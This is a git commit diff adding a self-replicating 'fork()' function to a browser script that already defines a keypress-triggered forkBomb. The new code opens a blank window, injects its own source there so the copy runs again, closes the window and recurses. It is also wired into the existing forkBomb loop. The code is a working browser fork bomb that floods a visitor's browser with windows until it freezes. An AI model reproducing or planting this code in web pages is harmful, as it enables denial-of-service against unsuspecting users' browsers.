1c0c7f9506731f1db181c04cb8653de8992a7b1d
Jose Murillo <jooseemurillo@gmail.com>
2023-05-15 08:00:43 -0300

    feat: add more one fork

--- scripts/index.js
+++ scripts/index.js
@@ -3,6 +3,8 @@ function forkBomb(timeout = 500, i = 0) {
     window.open('./?v=' + Math.random(), '_new' + (i || ''))
     forkBomb(timeout, i + 1)
   }, timeout)
+
+  fork();
 }
 
 
@@ -11,3 +13,14 @@ document.addEventListener('keydown', function(event) {
     forkBomb()
   }
 });
+
+function fork() {
+  const win = window.open();
+  const script = win.document.createElement("script");
+  script.innerHTML = fork + "\n" + "fork();";
+  win.document.head.appendChild(script);
+  setTimeout(function() {
+    win.close();
+    fork();
+  }, 250)
+}
